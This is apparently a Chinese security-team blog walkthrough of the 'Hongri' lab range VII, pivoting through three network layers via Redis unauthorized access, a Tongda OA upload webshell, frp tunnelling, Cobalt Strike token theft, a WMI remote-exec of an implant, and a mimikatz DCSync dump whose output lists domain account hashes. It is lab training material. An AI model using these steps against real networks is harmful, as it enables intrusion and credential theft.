#  红日靶场（七）WHOAMI Penetration（一）   
原创 Undefin3d团队  Undefin3d安全团队   2024-11-18 12:45  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51SZKvIeb0p3BrdwlM4ianxlufV2uvDecP3MDjNoZdibriaespbe93HC3Jw/640?wx_fmt=png "")  
  
  
  
·  
  
  
  
DMZ IP段为192.168.1.0/24  
  
·  
  
  
二层网络 IP段为192.168.52.0/24  
  
·  
  
  
三层网络 IP段为192.168.93.0/24  
## 第一层网络    
  
  
首先我们拿到靶机的ip为192.168.1.128，我们直接可以fscan进行端口扫描，发现了一个redis授权漏洞和一个Laravel的cve漏洞  
      
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51Y3AgVjRibppZnM4ibJsB8ic3V0Gde0QBERftM8AYhS37Fhlj1z05f0kTA/640?wx_fmt=png "")  
  
  
  
  
我们直接通过redis未授权写ssh密钥，拿到主机的shell  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51ASowlNBAybgSiaMIs5nANzFOqAvd97Tbfw14Vz6dUt3FmnFKFWBGOXg/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51TtLBrUib9qENqljstRMAibar80KLP4HlkibmZt8bMcRoKyzrc2YeicMFXw/640?wx_fmt=png "")  
  
  
      
  
  
然后我们直接viper上新建监听，然后一句话上线viper  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51BWtkIiaQqcS5hfp7U3hmZicmZdJYDDWecSOr4THxIA8wdH8Bu7ODDjKg/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51SN0d8kMPcMZzYfvL7AZSrBNTAJnvTP7NIfeZJIJjNW9qRqC4s9OIUA/640?wx_fmt=png "")  
  
  
  
  
直接在靶机上运行就可以上线viper  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51kE8yKo1quHKPNyqrrnWclj25RG72CLx5ATfxHtzMHICsIU7JSOSp5g/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j512PHXXicbEdFL5NcKRxhNtAxrRsOHrLujQXcVB9bIDt56o3icgC0hQzVQ/640?wx_fmt=png "")  
  
  
## 第二层网络    
  
  
然后我们添加内网路由，查看主机的ip  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j514kkUia053RF3wDMSLBNic6uNwb7NTKmyXU8a4UCxNOu57eamQ5KMN64A/640?wx_fmt=png "")  
  
  
  
  
发现存在内网192.168.52.0/24段的网络，我们上次fscan进行内网扫描，发现了一个通达oa  
      
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51xlG1rSmBqHKib5rkNb5zbNBdczMJj7IKeBQg3KsydenWDtb6th7rAag/640?wx_fmt=png "")  
  
  
  
  
我们先将通达的端口给转发到本地，然后进行访问  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51VRYFiaNA0qdfvwIRVaXhnQrmcjyvkXBaSFPZzEt0x98wRicQibc1cwVCQ/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51xfhd3JzRpqqJPRfHf0SK3icQibIQ25CxFlWHSbUpiaGewicnXgUNybTCVQ/640?wx_fmt=png "")  
  
  
  
  
我们使用通达oa的工具进行测试发现一个文件上传的漏洞，我们直接传入🐎上线蚁剑  
      
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51VHV4VT7cfwib23f3icxkmV0Z6R8oUCibsmFMTOib7qk0EXWibuT4gqshN8A/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j5115C9VuOiaAR2IpSGWgeeMwVvx5icfJ2s38EpwSicq2UXMwS3mszL5eM7A/640?wx_fmt=png "")  
  
  
      
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51jV5XNJhdsSnVVcHQMMMQ8tPXwz75j9ItoLnhgDnnRVdsnwNlD0kJgw/640?wx_fmt=png "")  
  
  
  
  
然后我们通过蚁剑上传我们viper的🐎，就可以上线了  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51SHhDbm6mKCcFViapBsNknT7hktk0KIOqy7SbFy1O8OgUVVW4VezFibWg/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51usapmPU6ibG5NI9rwTA2N1rRK9OZdcrFrrbAiaQgzmPyTUiaRCD2Q1Yuw/640?wx_fmt=png "")  
  
  
      
  
  
然后添加路由，但是我们发现上传的fscan没法运行，然后又是一台windows的系统，我们直接转cs上线，但是cs上线需要把我们的本地的端口转发到靶机里面，这样我们就可以监听到pc了，我们frp进行内网穿透，我们将第一台靶机设为我们的服务端，本地为客户端，这样就可以了  
  
  
第一台靶机  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51R7YmaRE2JG8v2WGFichx4B1Ujpmv7tc1aMjDVnSa6oMOf60maj645vQ/640?wx_fmt=png "")  
  
  
本地kali  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51Mqzodh9Orfeia9iaEpHm0n3NcJHGsfYSK8Qve6gK33ibY9zZoia6icKY9PQ/640?wx_fmt=png "")  
  
  
  
  
发现可以连通  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51Z0g4Vx1mu1226q9WTKOAeYE7OxLJVRgfmIb6CMh7lAWF1bbI5P3eAw/640?wx_fmt=png "")  
  
  
      
  
  
我们可以进行测试，在本机监听8008端口，然后在靶机上去访问nc 127.0.0.1 8008，发现可以了  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j519dMGiclJYahqEJaUz8XDVibL0icQhtWaOaSgjM23gVdc5eIQmbChbofEg/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j519dMGiclJYahqEJaUz8XDVibL0icQhtWaOaSgjM23gVdc5eIQmbChbofEg/640?wx_fmt=png "")  
  
  
  
  
然后我们就可以开启cs的去监听8008端口，viper直接已将转cs，就可以上线cs了  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51DmFibicXqqCoF6Gic5n5Xqk3tBImg4ukCOuyYc2g2jWwb6dBjjTtTRQIg/640?wx_fmt=png "")  
  
  
      
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j5171to1HoXs0Cad9FGP4ByicHZrTh14vjL6uR1WphAxfWzM0mbUCOyibuw/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51T4EcEnSQM5Iw8lCRIvW8C9SmMicmHmGygflzicbicRtaRV0UPqzpfBawA/640?wx_fmt=png "")  
  
  
## 第三层网络    
  
  
上线cs后我们进行端口的扫描，我们发现93段的ip，我们直接进行探测，然后发现DC的ip是192.168.93.30，和pc2的ip  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51A1Dm7icKa1SIXVwMPfniaPUrEzAEZvNicmP1icYwpuSiarMSicDTic1RVQDqw/640?wx_fmt=png "")  
  
  
  
  
然后通过 shell ipconfig /displaydns 来查看域名  
      
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51Y1Xu9Um2jriahc1oeDA0l4vHbh6qQG9ZcE1U7A8hznzicI3vpQiafgFoA/640?wx_fmt=png "")  
  
  
  
  
然后我们查看进程，会发现有域管的进程，我们可以进行令牌的窃取  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51ibDhWW32ecXMGVHmqJ0hnOicL7HaNeDD3JhOA0gEicssJVulRgkjuJkPw/640?wx_fmt=png "")  
  
  
      
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51IVZGhFFU9rF3b3RoaDHgY89ZPkpEj3hO7y3vUbDiblcnYZQB5VwPvKg/640?wx_fmt=png "")  
  
  
  
  
然后我们进行通过域管的权限去运行我们的🐎就可以上线域管的监听了  
  
  
remote-exec wmi 192.168.52.30 C:\MYOA\webroot\sh3.exe  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j51Q7G5uZ0PUxibxQws1ndoTLqSIcicBIX56QQVICmnlialjBhySPjXjH9dA/640?wx_fmt=png "")  
  
  
  
  
然后我们尝试导出域内所有用户的hash值，发现可以导出，然后我们就可以用DCsync攻击就可以  
  
  
[*] Tasked beacon to run mimikatz's lsadump::dcsync /domain:WHOAMIANONY.org /all /csv command            [+] host called home, sent: 787057 bytes            [+] received output:            [DC] 'WHOAMIANONY.org' will be the domain            [DC] 'DC.whoamianony.org' will be the DC server            [DC] Exporting domain 'WHOAMIANONY.org'            [rpc] Service  
  : ldap            [rpc] AuthnSvc : GSS_NEGOTIATE (9)            502  
    krbtgt  
    6be58bfcc0a164af2408d1d3bd313c2a  
    514            1001  
    whoami  
    ab89b1295e69d353dd7614c7a3a80cec  
    66048            1115  
    moretz  
    ba6723567ac2ca8993b098224ac27d90  
    66048            1002  
    DC$  
    202d13c79f52cc1d49870638e854afad  
    532480            1112  
    bunny  
    cc567d5556030b7356ee4915ff098c8f  
    66048            500  
    Administrator  
    ab89b1295e69d353dd7614c7a3a80cec  
    66048            1113  
    PC2$  
    65e034039585f728c8f15fe3f3b814ed  
    4096              
      
  
  
然后我们进行上🐎，直接上线dc，同样操作上线pc2  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j510sclryHkLnIElOck6gS4P3ZW8DCmuxFCE2UGetMVoIQrS1o50uibpqg/640?wx_fmt=png "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icHDOcTg0ZHJaF6TTIoCbX51wdjnP0j519g9PZESROFGfxhWGR3ziaZIpwV1M7RaSF6GicicZpzalKnef4piceicmzaA/640?wx_fmt=png "")  
  
  
      
  
